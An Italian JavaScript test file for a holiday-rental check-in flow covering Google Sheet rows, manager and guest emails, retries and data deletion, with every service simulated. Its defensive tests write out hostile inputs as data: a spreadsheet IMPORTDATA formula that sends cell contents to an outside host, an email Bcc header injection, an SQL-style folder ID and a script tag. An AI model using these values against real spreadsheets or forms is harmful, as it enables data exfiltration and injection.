// Test del flusso dopo il pagamento: dati al foglio Google (come prima), email al gestore (immagini in allegato, dati nel testo), email ospite,
// retry, cancellazioni. Tutto simulato: store in memoria, finto foglio, finta API Drive, finti invii email. Nessun servizio reale.
import test from 'node:test';
import assert from 'node:assert/strict';
import { elaboraCheckin, checkinIdDa, TTL_DOPO_PAGAMENTO_MS } from '../api/_elabora-checkin.js';
import { makeDrive, configDrive } from '../api/_drive.js';
import { componiEmail, inviaImmaginiAlGestore, preparaAllegati, bloccoOspite } from '../api/_email-gestore.js';
import { righeSheet, testoSicuro } from '../api/_sheet-checkin.js';
import { memStore, fintaDriveApi, ENV_DRIVE, checkinFamiglia, caricaTabelleOk, caricaTabelleKo, NOW, catturaLog, contieneSensibili, fintoJpeg, fintoPdf, dataUri } from './helpers.mjs';

const ENV = Object.assign({ EMAIL_PROPRIETARIO: 'gestore@esempio.invalid', EMAIL_USER: 'mittente@esempio.invalid', EMAIL_PASSWORD: 'x', SHEET_ID: 'FOGLIO_FINTO' }, ENV_DRIVE);
const sessione = (over) => Object.assign({ id: 'cs_test_finta0001', payment_status: 'paid', customer_details: { email: 'ospite@esempio.invalid' },
  metadata: { dataCheckin: '2026-11-05', appartamento: 'La Columbera - Torre, Appartamento con 2 camere da letto', numeroOspiti: '3', numeroNotti: '3', tipoGruppo: 'famiglia', totale: '13.5', lingua: 'it', temp_session_id: 'temp_1762000000000_abc123' } }, over || {});

function scenario(o) {
  o = o || {};
  let clock = NOW;
  const store = memStore(() => clock);
  const api = fintaDriveApi(o.drive);
  const drive = makeDrive({ env: o.env || ENV, fetch: api.fetch, getToken: async () => 'token-finto' });
  const ospite = [], gestore = [], logs = [], foglio = [];
  const deps = {
    store, env: o.env || ENV, now: () => clock,
    salvaSuSheet: async righe => { if (o.foglioKo && o.foglioKo-- > 0) throw Object.assign(new Error('x'), { code: 'ECONNRESET' }); foglio.push(...JSON.parse(JSON.stringify(righe))); },
    inviaEmailOspite: async p => { if (o.ospiteKo && o.ospiteKo-- > 0) throw Object.assign(new Error('x'), { code: 'ETIMEDOUT' }); ospite.push(JSON.parse(JSON.stringify(p))); return { success: true }; },
    inviaEmailGestore: async a => {
      if (o.gestoreKo && o.gestoreKo-- > 0) throw Object.assign(new Error('smtp'), { code: 'EAUTH', responseCode: 535 });
      const sent = [];
      await inviaImmaginiAlGestore(Object.assign({}, a, { transporter: { sendMail: async m => sent.push(m) } }));
      gestore.push(sent[0]);
    },
    log: m => logs.push(m)
  };
  const s = sessione();
  store.sessioni.set(s.metadata.temp_session_id, { data: checkinFamiglia(o.dati), expires: NOW + 2 * 3600e3 });
  return { store, api, deps, ospite, gestore, logs, foglio, s, avanza: ms => { clock += ms; } };
}

test('percorso completo: righe nel foglio come prima, email gestore con le immagini in allegato e i dati nel testo, email ospite minima, dati cancellati', async () => {
  const x = scenario();
  const { v: r, righe } = await catturaLog(() => elaboraCheckin(x.s, x.deps));
  assert.equal(r.esito, 'completato');
  const reg = x.store.registri.get(checkinIdDa(x.s.id));
  assert.equal(reg.sheet_stato, 'salvato');
  // stesse colonne e stessi valori della versione precedente
  assert.equal(x.foglio.length, 3);
  assert.deepEqual(Object.keys(x.foglio[0]), ['Data Check-in', 'Appartamento', 'Numero Ospiti', 'Numero Notti', 'Tipo Gruppo', 'Totale', 'Numero Ospite', 'Cognome', 'Nome', 'Genere', 'Data Nascita', 'Età', 'Cittadinanza', 'Luogo Nascita', 'Comune', 'Provincia', 'Timestamp', 'Tipo Documento', 'Numero Documento', 'Luogo Rilascio']);
  assert.deepEqual([x.foglio[0]['Cognome'], x.foglio[0]['Numero Documento'], x.foglio[0]['Totale'], x.foglio[0]['Età'], x.foglio[0]['Comune']], ['Provaccia', 'ZZ9900011', '13.5', '46', 'Roma']);
  assert.deepEqual([x.foglio[1]['Numero Ospite'], x.foglio[1]['Numero Documento'], x.foglio[1]['Comune']], ['2', '', '']);
  assert.equal(x.api.files.size, 0, 'nessun file su Drive');
  // email gestore: in allegato solo le immagini del documento (14/11/2026: nessun PDF di riepilogo), i dati degli ospiti nel testo
  assert.equal(x.gestore.length, 1);
  const m = x.gestore[0];
  assert.deepEqual(m.attachments.map(a => [a.filename, a.contentType]), [['documento-fronte.jpg', 'image/jpeg'], ['documento-retro.jpg', 'image/jpeg']]);
  assert.deepEqual(contieneSensibili(m.subject), [], 'nessun dato personale nell\'oggetto');
  for (const v of ['Ermenegilda', 'Provaccia', 'Teodorico', 'Clotilde', 'ZZ9900011']) assert.ok(m.text.includes(v), 'nel testo dell\'email: ' + v);
  assert.match(m.subject, /^Check-in · senza numero di prenotazione · Torre · 05\/11\/2026 \(rif\. ck[0-9a-f]+\)$/, m.subject);
  assert.match(m.text, /Numero prenotazione: non indicato/);
  assert.match(m.text, /^Nuovo check-in ricevuto!/); assert.match(m.text, /- Data check-in: 05\/11\/2026/); assert.match(m.text, /- Appartamento: La Columbera - Torre/);
  assert.match(m.text, /- Ospiti: 3 \(3 registrati\)/); assert.match(m.text, /- Notti: 3/); assert.match(m.text, /- Totale tassa soggiorno: €13\.50/); assert.match(m.text, /Responsabile: Ermenegilda Provaccia/);
  assert.match(m.text, /OSPITI REGISTRATI \(3\):/); assert.match(m.text, /In allegato: 2 immagine\/i del documento del responsabile \(da confrontare con i dati qui sopra\)\./);
  assert.ok(!/PDF/.test(m.text), 'nessun riferimento a un PDF di riepilogo'); assert.ok(!/Dati per Alloggiati Web/.test(m.text), 'con il foglio a posto non serve ripeterlo');
  assert.equal(x.deps.generaPdfRiepilogo, undefined, 'nessun generatore di PDF tra le dipendenze del flusso');
  // email ospite: niente documenti né date di nascita
  assert.equal(x.ospite.length, 1);
  assert.deepEqual(Object.keys(x.ospite[0].datiPrenotazione).sort(), ['appartamento', 'dataCheckin', 'lingua', 'numeroNotti', 'numeroOspiti', 'ospiti', 'totale']);
  // minimizzazione
  assert.equal(x.store.sessioni.size, 0, 'dati temporanei eliminati');
  assert.deepEqual(contieneSensibili(JSON.stringify(reg)), [], 'registro senza dati personali');
  assert.deepEqual(contieneSensibili(righe.join('\n') + x.logs.join('\n')), [], 'log senza dati personali');
});

test('errore del foglio: retry senza righe duplicate, dati conservati fino al successo', async () => {
  const x = scenario({ foglioKo: 1 });
  const r1 = await elaboraCheckin(x.s, x.deps);
  assert.equal(r1.esito, 'da_ripetere');
  assert.equal(x.foglio.length, 0);
  assert.equal(x.store.sessioni.size, 1, 'dati NON cancellati prima del successo');
  assert.equal(x.store.sessioni.get(x.s.metadata.temp_session_id).expires, NOW + TTL_DOPO_PAGAMENTO_MS);
  assert.match(x.gestore[0].text, /NON ancora inviati/);
  x.avanza(60e3);
  assert.equal((await elaboraCheckin(x.s, x.deps)).esito, 'completato');
  assert.equal(x.foglio.length, 3, 'righe scritte una sola volta');
  assert.equal(x.ospite.length, 1); assert.equal(x.gestore.length, 1);
  assert.equal(x.store.sessioni.size, 0);
  assert.equal((await elaboraCheckin(x.s, x.deps)).esito, 'completato', 'evento consegnato di nuovo da Stripe');
  assert.equal(x.foglio.length, 3);
});

test('email al gestore: i dati di tutti gli ospiti nel testo, come nel vecchio PDF di riepilogo; solo le immagini in allegato', async () => {
  const x = scenario();
  await catturaLog(() => elaboraCheckin(x.s, x.deps));
  const t = x.gestore[0].text;
  // 14/11/2026: il PDF non si crea più; ogni dato che c'era nel PDF è nel testo, nello stesso ordine
  const dopo = t.slice(t.indexOf('OSPITI REGISTRATI'));
  assert.equal(dopo.split('\n').slice(0, 8).join('\n'), [
    'OSPITI REGISTRATI (3):', '',
    '1. Provaccia Ermenegilda (RESPONSABILE)',
    '   Genere: Femmina',
    '   Data di nascita: 19/04/1980 (' + Math.floor((NOW - Date.UTC(1980, 3, 19)) / 31556952000) + ' anni, tassabile)',
    '   Cittadinanza: Italia',
    '   Luogo di nascita: Italia · Roma (RM)',
    '   Documento: CARTA IDENTITA\' ELETTRONICA · n. ZZ9900011 · rilasciato in: Italia'].join('\n'));
  assert.match(t, /\n2\. Provaccia Teodorico\n   Genere: Maschio\n   Data di nascita: 10\/11\/2010 \(\d+ anni, tassabile\)\n   Cittadinanza: Germania\n   Luogo di nascita: Germania\n\n3\. /);
  assert.match(t, /\n3\. Provaccia Clotilde\n   Genere: Femmina\n.*\n   Cittadinanza: Italia\n   Luogo di nascita: Italia · Reggio nell'Emilia \(RE\)\n/);
  assert.equal((t.match(/Documento:/g) || []).length, 1, 'il documento è solo quello del responsabile');
  // nessun allegato che non sia un'immagine del documento, nessun servizio esterno
  assert.ok(x.gestore[0].attachments.every(a => /^documento-(fronte|retro)\.(jpg|png|pdf)$/.test(a.filename)));
  assert.deepEqual(x.gestore[0].attachments.filter(a => /riepilogo|checkin-/.test(a.filename)), []);
  // l'oggetto resta senza dati personali
  assert.deepEqual(contieneSensibili(x.gestore[0].subject), []);
});

test('email al gestore: bambini esenti, età di un anno, valori su più righe o vuoti, nove ospiti', () => {
  const g = bloccoOspite({ cognome: 'Rossi\nBcc: x@esempio.invalid', nome: '  Mario  ', genere: 'M', nascita: '2025-01-01', eta: 1, cittadinanza: 'Italia', luogoNascita: 'Francia' }, 2);
  assert.equal(g, '2. Rossi Bcc: x@esempio.invalid Mario\n   Genere: Maschio\n   Data di nascita: 01/01/2025 (1 anno, esente)\n   Cittadinanza: Italia\n   Luogo di nascita: Francia');
  // imposta dai 14 anni (14/11/2026; prima dai 4): fino a 13 anni esenti, da 14 tassabili
  assert.match(bloccoOspite({ nascita: '2022-06-01', eta: 3 }, 1), /\(3 anni, esente\)/);
  assert.match(bloccoOspite({ nascita: '2013-06-01', eta: 13 }, 1), /\(13 anni, esente\)/);
  assert.match(bloccoOspite({ nascita: '2012-06-01', eta: 14 }, 1), /\(14 anni, tassabile\)/);
  assert.match(bloccoOspite({ nascita: '1980-06-01', eta: 46 }, 1), /\(46 anni, tassabile\)/);
  const vuoto = bloccoOspite({}, 5);
  assert.equal(vuoto, '5. —\n   Genere: —\n   Data di nascita: —\n   Cittadinanza: —\n   Luogo di nascita: —');
  assert.ok(!/Documento/.test(bloccoOspite({ isResponsabile: true }, 1)), 'responsabile senza estremi del documento: nessuna riga vuota');
  assert.match(bloccoOspite({ isResponsabile: true, tipoDocumento: 'PATENTE DI GUIDA' }, 1), /Documento: PATENTE DI GUIDA · n\. — · rilasciato in: —/);
  // un valore enorme non gonfia l'email
  assert.ok(bloccoOspite({ cognome: 'x'.repeat(5000) }, 1).length < 400);
  // nove ospiti: tutti nell'elenco, nell'ordine dato
  const nove = Array.from({ length: 9 }, (_, i) => ({ numero: i + 1, isResponsabile: i === 0, cognome: 'Rossi' + (i + 1), nome: 'Anna', genere: 'F', nascita: '1990-01-01', eta: 36, cittadinanza: 'Italia', luogoNascita: 'Italia', comune: 'Roma', provincia: 'RM' }));
  const { testo } = componiEmail({ riferimento: 'ck01234567', statoTxt: 'inviati al foglio', numeroAllegati: 1, riepilogo: { dataCheckin: '2026-11-05', appartamento: 'La Columbera - Torre', ospiti: 9, registrati: 9, notti: 2, totale: 27, responsabile: 'Anna Rossi1', ospitiDettaglio: nove } });
  assert.match(testo, /OSPITI REGISTRATI \(9\):/);
  assert.deepEqual([...testo.matchAll(/^(\d)\. (Rossi\d) Anna/gm)].map(m => m[1] + m[2]), nove.map((o, i) => (i + 1) + o.cognome));
  // senza l'elenco (chiamata di prova senza riepilogo dettagliato) l'email resta quella di prima, senza dati personali
  const senza = componiEmail({ riferimento: 'ck01234567', statoTxt: 'x', numeroAllegati: 1, riepilogo: { dataCheckin: '2026-11-05', appartamento: 'Torre', ospiti: 1, registrati: 1, notti: 1, totale: 1.5, responsabile: 'X' } });
  assert.ok(!/OSPITI REGISTRATI/.test(senza.testo)); assert.match(senza.testo, /In allegato: 1 immagine\/i del documento del responsabile\.\n/);
});

test('email al gestore: se l\'invio fallisce niente PDF né altri servizi da richiamare; si riprova e l\'email parte una sola volta', async () => {
  const x = scenario({ gestoreKo: 1 });
  const r1 = await elaboraCheckin(x.s, x.deps);
  assert.equal(r1.esito, 'da_ripetere'); assert.equal(x.gestore.length, 0);
  assert.equal((await elaboraCheckin(x.s, x.deps)).esito, 'completato');
  assert.equal(x.gestore.length, 1); assert.match(x.gestore[0].text, /OSPITI REGISTRATI \(3\):/);
});

test('righe del foglio: ospite singolo e campi mancanti come nella versione precedente', () => {
  const d = checkinFamiglia({ numeroOspiti: 1, tipoGruppo: null }); d.ospiti = d.ospiti.slice(0, 1);
  const r = righeSheet(d, { totale: '4.5', timestamp: '2026-11-02T08:00:00.000Z' }, new Date(NOW));
  assert.equal(r.length, 1); assert.equal(r[0]['Tipo Gruppo'], ''); assert.equal(r[0]['Timestamp'], '2026-11-02T08:00:00.000Z');
  assert.equal(righeSheet(Object.assign({}, d, { ospiti: [{ numero: 1, nascita: '2025-01-01' }] }), {}, new Date(NOW))[0]['Età'], '1');
});

test('foglio Google: un testo che inizia con = + - @ non diventa una formula; il numero del documento con zeri davanti resta testo; il resto è identico a prima', () => {
  // valori normali: nessuna differenza rispetto a prima (lo script del gestore che legge il foglio non vede nulla di nuovo)
  const d = checkinFamiglia();
  const normali = righeSheet(d, { totale: '13.5', timestamp: '2026-11-05T10:00:00.000Z' }, new Date(NOW));
  assert.deepEqual(normali[0], { 'Data Check-in': '2026-11-05', Appartamento: 'La Columbera - Torre, Appartamento con 2 camere da letto', 'Numero Ospiti': '3', 'Numero Notti': '3', 'Tipo Gruppo': 'famiglia', Totale: '13.5',
    'Numero Ospite': '1', Cognome: 'Provaccia', Nome: 'Ermenegilda', Genere: 'F', 'Data Nascita': '1980-04-19', Età: '46', Cittadinanza: 'Italia', 'Luogo Nascita': 'Italia', Comune: 'Roma', Provincia: 'RM',
    Timestamp: '2026-11-05T10:00:00.000Z', 'Tipo Documento': "CARTA IDENTITA' ELETTRONICA", 'Numero Documento': 'ZZ9900011', 'Luogo Rilascio': 'Italia' });
  // formule scritte da chi chiama l'API a mano
  d.ospiti[0].cognome = '=IMPORTDATA("https://esempio.invalid/?x="&A1)'; d.ospiti[0].nome = '+SUM(1;1)'; d.ospiti[0].comune = '-2+3'; d.ospiti[0].luogoRilascio = '@SUM(1)';
  d.ospiti[1].cognome = '=HYPERLINK("https://esempio.invalid")'; d.appartamento = '=1+1';
  const r = righeSheet(d, { totale: '13.5', timestamp: '=NOW()' }, new Date(NOW));
  assert.deepEqual([r[0].Cognome, r[0].Nome, r[0].Comune, r[0]['Luogo Rilascio'], r[1].Cognome, r[0].Appartamento, r[0].Timestamp],
    ['\'=IMPORTDATA("https://esempio.invalid/?x="&A1)', "'+SUM(1;1)", "'-2+3", "'@SUM(1)", '\'=HYPERLINK("https://esempio.invalid")', "'=1+1", "'=NOW()"]);
  for (const riga of r) for (const [k, v] of Object.entries(riga)) if (!['Data Check-in', 'Data Nascita', 'Numero Ospiti', 'Numero Notti', 'Totale', 'Numero Ospite', 'Età', 'Genere'].includes(k)) assert.ok(!/^[=+\-@]/.test(v), k + ': ' + v);
  // date, numeri e valori normali restano com'erano; un trattino o un più dentro il testo non conta
  assert.equal(testoSicuro('Jean-Pierre'), 'Jean-Pierre'); assert.equal(testoSicuro("D'Angelo"), "D'Angelo"); assert.equal(testoSicuro(''), ''); assert.equal(testoSicuro(null), ''); assert.equal(testoSicuro(undefined), '');
  assert.equal(testoSicuro('\t=1+1'), "'\t=1+1", 'anche dopo una tabulazione iniziale');
  // numero del documento: zeri davanti e numeri lunghi si conservano come testo; gli altri come prima
  for (const [v, atteso] of [['012345678', "'012345678"], ['0', "'0"], ['1234567890123456', "'1234567890123456"], ['123456789012345', '123456789012345'], ['123456789', '123456789'], ['AB0123', 'AB0123'], ['C01X00T47', 'C01X00T47'], ['', '']])
    assert.equal(testoSicuro(v, true), atteso, v);
  assert.equal(testoSicuro('012345678'), '012345678', 'fuori dal numero del documento non cambia nulla');
  d.ospiti[0].numeroDocumento = '007812345';
  assert.equal(righeSheet(d, {}, new Date(NOW))[0]['Numero Documento'], "'007812345");
});

test('Drive: file già presente con lo stesso contenuto viene riutilizzato; contenuto diverso o MD5 errato = errore', async () => {
  const api = fintaDriveApi();
  const d = makeDrive({ env: ENV, fetch: api.fetch, getToken: async () => 't' });
  const a = await d.caricaTxt({ nomeFile: 'a.txt', contenuto: 'RIGA\r\n', checkinId: 'ck0000000000000001' });
  const b = await d.caricaTxt({ nomeFile: 'a.txt', contenuto: 'RIGA\r\n', checkinId: 'ck0000000000000001' });
  assert.equal(a.fileId, b.fileId); assert.equal(b.riutilizzato, true); assert.equal(api.files.size, 1);
  await assert.rejects(d.caricaTxt({ nomeFile: 'a.txt', contenuto: 'ALTRO\r\n', checkinId: 'ck0000000000000001' }), e => e.kind === 'contenuto_diverso_gia_presente');
  const api2 = fintaDriveApi({ md5Sbagliato: true });
  await assert.rejects(makeDrive({ env: ENV, fetch: api2.fetch, getToken: async () => 't' }).caricaTxt({ nomeFile: 'b.txt', contenuto: 'X', checkinId: 'ck0000000000000002' }), e => e.kind === 'verifica_contenuto_fallita');
  const api3 = fintaDriveApi({ quota: true });
  await assert.rejects(makeDrive({ env: ENV, fetch: api3.fetch, getToken: async () => 't' }).caricaTxt({ nomeFile: 'c.txt', contenuto: 'X', checkinId: 'ck0000000000000003' }), e => e.kind === 'caricamento_http' && e.motivo === 'storageQuotaExceeded');
  assert.deepEqual(configDrive({}).missing, ['GOOGLE_DRIVE_ALLOGGIATI_FOLDER_ID', 'GOOGLE_CLIENT_EMAIL', 'GOOGLE_PRIVATE_KEY']);
  assert.equal(configDrive(Object.assign({}, ENV, { GOOGLE_DRIVE_ALLOGGIATI_FOLDER_ID: "x' or '1'='1" })).ok, false, 'ID cartella non valido rifiutato');
});

test('foglio non configurato: nessun retry infinito, dati tenuti al massimo 72 ore', async () => {
  const env = { EMAIL_PROPRIETARIO: 'gestore@esempio.invalid', EMAIL_USER: 'm@esempio.invalid', EMAIL_PASSWORD: 'x' };
  const x = scenario({ env });
  const r = await elaboraCheckin(x.s, x.deps);
  assert.equal(r.esito, 'completato');
  assert.equal(x.store.registri.get(checkinIdDa(x.s.id)).sheet_stato, 'non_configurato');
  assert.equal(x.store.sessioni.size, 1);
  assert.match(x.gestore[0].text, /configurazione mancante/);
});

test('errori email: retry controllato, nessun duplicato', async () => {
  const x = scenario({ gestoreKo: 1, ospiteKo: 1 });
  const r1 = await elaboraCheckin(x.s, x.deps);
  assert.equal(r1.esito, 'da_ripetere');
  assert.equal(x.store.sessioni.size, 1, 'immagini non cancellate finché l\'email al gestore non parte');
  const r2 = await elaboraCheckin(x.s, x.deps);
  assert.equal(r2.esito, 'completato');
  assert.equal(x.ospite.length, 1); assert.equal(x.gestore.length, 1); assert.equal(x.foglio.length, 3);
  assert.equal(x.store.sessioni.size, 0);
});

test('elaborazione concorrente dello stesso evento: la seconda non procede', async () => {
  const x = scenario();
  const id = checkinIdDa(x.s.id);
  await x.store.ottieniOCreaRegistro({ checkinId: id, stripeSessionId: x.s.id });
  await x.store.acquisisciLease(id, 55e3);
  const r = await elaboraCheckin(x.s, x.deps);
  assert.equal(r.esito, 'in_corso'); assert.equal(x.ospite.length, 0); assert.equal(x.foglio.length, 0);
});

test('dati temporanei scaduti: foglio ed email gestore non rifatti e dichiarati non disponibili', async () => {
  const x = scenario();
  x.avanza(3 * 3600e3);       // oltre le 2 ore prima del pagamento
  const r = await elaboraCheckin(x.s, x.deps);
  const reg = x.store.registri.get(checkinIdDa(x.s.id));
  assert.equal(r.esito, 'completato');
  assert.equal(reg.sheet_stato, 'dati_non_disponibili'); assert.equal(reg.email_gestore_stato, 'dati_non_disponibili');
  assert.equal(x.ospite.length, 1, 'email ospite comunque inviata (codici cassetta)');
  assert.deepEqual(x.ospite[0].datiPrenotazione.ospiti, []);
});

test('email gestore: allegati solo immagini valide, nomi generici, firma dei byte verificata', () => {
  const { allegati, scartati } = preparaAllegati([
    { lato: 'fronte', base64: dataUri('image/png', fintoJpeg()) },              // dichiarato png, in realtà jpeg: vale la firma
    { lato: 'retro', base64: dataUri('application/pdf', fintoPdf()) },
    { lato: 'fronte', base64: Buffer.from('<script>alert(1)</script>'.repeat(10)).toString('base64') },
    { lato: 'altro', base64: fintoJpeg().toString('base64') }
  ]);
  assert.deepEqual(allegati.map(a => [a.filename, a.contentType]), [['documento-fronte.jpg', 'image/jpeg'], ['documento-retro.pdf', 'application/pdf']]);
  assert.equal(scartati.length, 2);
  const { oggetto, testo } = componiEmail({ riferimento: 'ck01234567', statoTxt: 'x', numeroAllegati: 2 });
  assert.ok(!/Provaccia|ZZ99|nato|nascita/i.test(oggetto + testo));
});

test('email al gestore: il numero di prenotazione nell\'oggetto (verificato dall\'ospite o trovato nel foglio per data e appartamento)', () => {
  const base = { dataCheckin: '2026-10-30', appartamento: 'La Columbera - Torre, Appartamento con 2 camere da letto', ospiti: 2, registrati: 2, notti: 2, totale: 6, responsabile: 'X' };
  let e = componiEmail({ riferimento: 'ck01234567', statoTxt: 'inviati al foglio', numeroAllegati: 1, riepilogo: Object.assign({ numeroPrenotazione: '6397656355', numeroDa: 'ospite' }, base) });
  assert.equal(e.oggetto, 'Check-in · Prenotazione 6397656355 · Torre · 30/10/2026 (rif. ck01234567)');
  assert.match(e.testo, /Numero prenotazione: 6397656355\n/);
  e = componiEmail({ riferimento: 'ck01234567', statoTxt: 'inviati al foglio', numeroAllegati: 1, riepilogo: Object.assign({ numeroPrenotazione: '6397656355', numeroDa: 'foglio' }, base, { appartamento: 'La Columbera - Corte' }) });
  assert.equal(e.oggetto, 'Check-in · Prenotazione 6397656355 · Corte · 30/10/2026 (rif. ck01234567)');
  assert.match(e.testo, /trovato per data di arrivo e appartamento/);
});
